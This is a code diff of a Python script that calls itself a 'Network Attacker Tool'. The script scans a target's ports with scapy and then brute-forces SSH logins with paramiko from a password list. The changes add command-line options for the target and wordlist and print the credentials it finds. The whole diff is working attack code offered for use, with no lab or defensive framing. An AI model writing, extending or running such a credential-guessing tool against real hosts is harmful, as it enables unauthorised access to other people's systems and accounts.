@@ -1,6 +1,7 @@
 from scapy.all import *
 from scapy.layers.inet import TCP, IP, ICMP
 import paramiko
+import argparse
 
 def scanport(port, target):
     source_port = RandShort()
@@ -19,7 +20,7 @@ def scanport(port, target):
                 print(f"Connection closed: {port}")
                 return True
             else:
-               print(f"Port is closed or filtered: {port}")
+               #print(f"Port is closed or filtered: {port}")
                return False
         else:
             print(False)
@@ -37,13 +38,13 @@ def target_availability(target):
         print(e)
         return False
 
-def BruteForce(port, target):
+def BruteForce(port, target,passlist):
 
     user = input("Enter the target's username: ")
     SSHconn = paramiko.SSHClient()
     SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     # Opening the "password.txt" file in read mode ("r")
-    with open("PasswordList.txt", "r") as file:
+    with open(passlist, "r") as file:
         # Reading the file's contents
         passwords = file.read().splitlines()
 
@@ -51,6 +52,7 @@ def BruteForce(port, target):
         try:
             SSHconn.connect(target, port=int(port), password=password, username=user, timeout=1)
             print(f"Logged in with password: {password}")
+            print(f"Login: {user}  password: {password}")
             break
         except paramiko.AuthenticationException:
             print(f"Login failed with password: {password}")
@@ -59,7 +61,14 @@ def BruteForce(port, target):
     SSHconn.close()
 
 def main():
-    target = input("Enter the target's IP address: ")
+    parser = argparse.ArgumentParser(description="Network Attacker Tool")
+    parser.add_argument("--PassList", help="Specify the password list file to use", required=True)
+    parser.add_argument("-T", help="Target IP address", required=True)
+
+    args = parser.parse_args()
+    pass_list_file = args.PassList
+    target = args.T
+
     open_ports = []
 
     if target_availability(target):
@@ -78,7 +87,7 @@ def main():
         print("Port 22 (SSH) is available.")
         choice = input("Do you want to perform BruteForce on port 22? (Y/N): ").lower()
         if choice.lower() == "y":
-            BruteForce(22, target)
+            BruteForce(22, target,pass_list_file)
         else:
             print("BruteForce not performed on port 22.")
 
